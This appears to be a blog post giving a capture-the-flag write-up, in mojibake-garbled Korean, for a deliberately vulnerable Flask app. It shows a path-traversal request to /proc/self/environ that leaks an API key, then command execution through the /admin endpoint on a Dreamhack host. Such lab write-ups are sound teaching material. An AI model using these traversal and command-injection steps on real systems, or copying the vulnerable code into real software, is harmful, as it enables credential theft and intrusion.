---
title: "[2025-07-27] File Vulnerability advanced for Linux"
excerpt: "File Vulnerability advanced"

categories:
  - Problem
tags:
  - [File Vulnerability]

permalink: /Problem/[2025-07-27] File Vulnerability advanced for Linux/

toc: true
toc_sticky: true

date: 2025-07-27
last_modified_at: 2025-07-27
---

## ğŸ¦¥ ë³¸ë¬¸

- main.py

```python
import os, subprocess
from functools import wraps
from flask import Flask, request

app = Flask(__name__)
API_KEY = os.environ.get('API_KEY', None)

def key_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.args.get('API_KEY', None)
        if API_KEY and apikey:
            if apikey == API_KEY:
                return view(**kwargs)
        return 'Access Denied !'
    return wrapped_view

@app.route('/', methods=['GET'])
def index():
    return 'API Index'

@app.route('/file', methods=['GET'])
def file():
    path = request.args.get('path', None)
    if path:
        data = open('./files/' + path).read()
        return data
    return 'Error !'

@app.route('/admin', methods=['GET'])
@key_required
def admin():
    cmd = request.args.get('cmd', None)
    if cmd:
        result = subprocess.getoutput(cmd)
        return result
    else:
        return 'Error !'

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)

```

/file APIëŠ” ì´ìš©ìê°€ ì…ë ¥í•˜ëŠ” ê²½ë¡œì— ìˆëŠ” íŒŒì¼ì„ ì½ì–´ë“¤ì´ëŠ” APIì´ë‹¤.

/admin APIëŠ” cmd íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ ì‹œìŠ¤í…œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ëŠ” íŒŒì¼ì´ë‹¤. ì´ ë•Œ @key_required ë°ì½”ë ˆì´í„°ë¥¼ í†µí•´ API_Keyê°€ í™˜ê²½ ë³€ìˆ˜ì— ìˆëŠ” ê°’ê³¼ ê°™ì€ ì§€ë¥¼ íŒë‹¨í•œë‹¤. 

ì¦‰, file APIë¥¼ í†µí•´ `/proc/self/environ` ì—ì„œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì•Œì•„ë‚´ê³  ê·¸ í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ admin APIì— ì ‘ê·¼í•˜ì—¬ flagë¥¼ ì–»ì–´ ë‚´ë©´ ëœë‹¤.

ì´ ë•Œ ê¶Œí•œì„ í™•ì¸í•´ì•¼ í•˜ëŠ” ê²Œ ê¶Œí•œ í™•ì¸ ì•ˆí•˜ê³  ê³„ì† cmd ê°’ì— cat /flagë¥¼ ë„£ìœ¼ë‹ˆê¹ ì‹¤í–‰ì´ ì•ˆëœë‹¤. 

### í’€ì´

1. `file?path=../../proc/self/environ` ì„ í†µí•´ API_KEYë¥¼ ê°€ì ¸ì˜¨ë‹¤.
    - API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f
2. admin APIì— API_KEYì™€ cmdë¥¼ íŒŒë¼ë¯¸í„°ë¡œ ì ‘ê·¼í•œë‹¤. ì´ ë•Œ `cmd=ls -al /` ì„ ì…ë ¥í•˜ì—¬ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì— ê¶Œí•œ ê¹Œì§€ í™•ì¸í•œë‹¤.

```python
http://host8.dreamhack.games:8251/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&cmd=ls -al /
```

1. ---x--x--x ê¶Œí•œì´ë¯€ë¡œ ì‹¤í–‰ë§Œ  ê°€ëŠ¥í•˜ê³  ì½ê¸° ê¶Œí•œì€ ì—†ë‹¤ ê·¸ëŸ¬ë¯€ë¡œ `cmd=/flag` ë¥¼ í†µí•´ ì‹¤í–‰ì‹œì¼œì„œ ì¶œë ¥ì‹œí‚¨ë‹¤.